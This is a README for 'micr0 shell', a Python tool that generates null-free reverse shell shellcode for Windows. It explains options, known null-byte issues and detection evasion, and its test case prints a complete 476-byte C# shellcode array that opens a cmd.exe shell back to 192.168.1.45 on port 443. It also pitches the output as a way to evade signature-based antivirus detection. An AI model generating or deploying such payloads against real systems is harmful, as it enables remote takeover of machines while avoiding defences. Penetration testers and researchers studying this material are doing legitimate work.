# micr0 shell
`micr0 shell` is a Python script that dynamically generates PIC Null-Free reverse shell shellcode. It is light, convenient, and fast. Generated shellcode can be `27 bytes` smaller than MSF's shellcode (Do not contain `0x00`) at most, depending on supplied shellcode options. Generated shellcode can also be used to evade signature-based detection, considering MSF's shellcode is used widely.


## Background

## How to Use
### Install Keystone Engine


### Script Usage
The user can supply the IP address, listening port, variable name, shellcode format(C/CSharp/python/powershell), shell type(powershell/cmd), and whether to execute generated shellcode(True/False).

Only the `IP address` must be specified to make the shellcode work well. The default port value is `443`, the default variable name is `buf`, the default language is `python`, and the default shell type is `cmd.exe`.

Users can choose to execute generated shellcode in this Python script, generated shellcode can also be saved in a binary file. By default, generated shellcode is `NOT EXECUTED` and `NOT SAVED` in a file.

### Simple Shellcode Runner
#### C
```c

```

#### Csharp
```csharp

```

#### PowerShell
```powershell

```

#### Python
```python

```

## Known Issues
1. According to the supplied IP address, port, and shell type, micr0 shell dynamically generates Null-Free shellcode. I have considered most of the common situations that could generate Null bytes, however, I am aware that if the supplied IP address contains `.255` and `.0` at the same time, for instance, if the IP address is `192.168.0.255`, generated shellcode will contain Null byte. This type of IP address could be rare in practice, and eliminating Null byte for all IP addresses would add more complexity. Therefore, I do not intend to improve this part recently.

2. Regarding the port value, in theory, any port will not generate Null byte. However, due to the implementation of eliminating Null-byte, port `65280` is not usable.

## Future Plan


## Test Case

```cmd
─# python3 micr0shell.py --ip 192.168.1.45 --port 443 --type cmd --language csharp --variable sc --execution false --save True --output sc.bin

███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/micr0_shell
Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255


[+]Shellcode Settings:
******** IP Address: 192.168.1.45
******** Listening Port: 443
******** Language of desired shellcode runner: csharp
******** Shellcode array variable name: sc
******** Shell: cmd
******** Shellcode Execution: false
******** Save Shellcode to file: true


[+]Payload size: 476 bytes

[+]Shellcode format for C#

byte[] sc= new byte[476] {
0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x20,0x4c,0x8b,0x0e,0x4d,
0x8b,0x09,0x4d,0x8b,0x49,0x20,0xeb,0x63,0x41,0x8b,0x49,0x3c,0x4d,0x31,0xff,0x41,0xb7,0x88,0x4d,0x01,
0xcf,0x49,0x01,0xcf,0x45,0x8b,0x3f,0x4d,0x01,0xcf,0x41,0x8b,0x4f,0x18,0x45,0x8b,0x77,0x20,0x4d,0x01,
0xce,0xe3,0x3f,0xff,0xc9,0x48,0x31,0xf6,0x41,0x8b,0x34,0x8e,0x4c,0x01,0xce,0x48,0x31,0xc0,0x48,0x31,
0xd2,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xca,0x0d,0x01,0xc2,0xeb,0xf4,0x44,0x39,0xc2,0x75,0xda,0x45,
0x8b,0x57,0x24,0x4d,0x01,0xca,0x41,0x0f,0xb7,0x0c,0x4a,0x45,0x8b,0x5f,0x1c,0x4d,0x01,0xcb,0x41,0x8b,
0x04,0x8b,0x4c,0x01,0xc8,0xc3,0xc3,0x4c,0x89,0xcd,0x41,0xb8,0x8e,0x4e,0x0e,0xec,0xe8,0x8f,0xff,0xff,
0xff,0x49,0x89,0xc4,0x48,0x31,0xc0,0x66,0xb8,0x6c,0x6c,0x50,0x48,0xb8,0x57,0x53,0x32,0x5f,0x33,0x32,
0x2e,0x64,0x50,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x4c,0x89,0xe0,0xff,0xd0,0x48,0x83,0xc4,0x20,0x49,
0x89,0xc6,0x49,0x89,0xc1,0x41,0xb8,0xcb,0xed,0xfc,0x3b,0x4c,0x89,0xcb,0xe8,0x55,0xff,0xff,0xff,0x48,
0x31,0xc9,0x66,0xb9,0x98,0x01,0x48,0x29,0xcc,0x48,0x8d,0x14,0x24,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,
0x30,0xff,0xd0,0x48,0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0xd9,0x09,0xf5,0xad,0xe8,0x2b,0xff,0xff,
0xff,0x48,0x83,0xec,0x30,0x48,0x31,0xc9,0xb1,0x02,0x48,0x31,0xd2,0xb2,0x01,0x4d,0x31,0xc0,0x41,0xb0,
0x06,0x4d,0x31,0xc9,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,0x24,0x28,0xff,0xd0,0x49,0x89,0xc4,0x48,
0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0x0c,0xba,0x2d,0xb3,0xe8,0xf3,0xfe,0xff,0xff,0x48,0x83,0xec,
0x20,0x4c,0x89,0xe1,0x48,0x31,0xd2,0xb2,0x02,0x48,0x89,0x14,0x24,0x48,0x31,0xd2,0x66,0xba,0x01,0xbb,
0x48,0x89,0x54,0x24,0x02,0xba,0xc0,0xa8,0x01,0x2d,0x48,0x89,0x54,0x24,0x04,0x48,0x8d,0x14,0x24,0x4d,
0x31,0xc0,0x41,0xb0,0x16,0x4d,0x31,0xc9,0x48,0x83,0xec,0x38,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,
0x24,0x28,0x4c,0x89,0x4c,0x24,0x30,0xff,0xd0,0x48,0x83,0xc4,0x38,0x49,0x89,0xe9,0x41,0xb8,0x72,0xfe,
0xb3,0x16,0xe8,0x99,0xfe,0xff,0xff,0x48,0xba,0x9c,0x92,0x9b,0xd1,0x9a,0x87,0x9a,0xff,0x48,0xf7,0xd2,
0x52,0x48,0x89,0xe2,0x41,0x54,0x41,0x54,0x41,0x54,0x48,0x31,0xc9,0x66,0x51,0x51,0x51,0xb1,0xff,0x66,
0xff,0xc1,0x66,0x51,0x48,0x31,0xc9,0x66,0x51,0x66,0x51,0x51,0x51,0x51,0x51,0x51,0x51,0xb1,0x68,0x51,
0x48,0x89,0xe7,0x48,0x89,0xe1,0x48,0x83,0xe9,0x20,0x51,0x57,0x48,0x31,0xc9,0x51,0x51,0x51,0x48,0xff,
0xc1,0x51,0xfe,0xc9,0x51,0x51,0x51,0x51,0x49,0x89,0xc8,0x49,0x89,0xc9,0xff,0xd0};


Generated shellcode successfully saved in file sc.bin
```
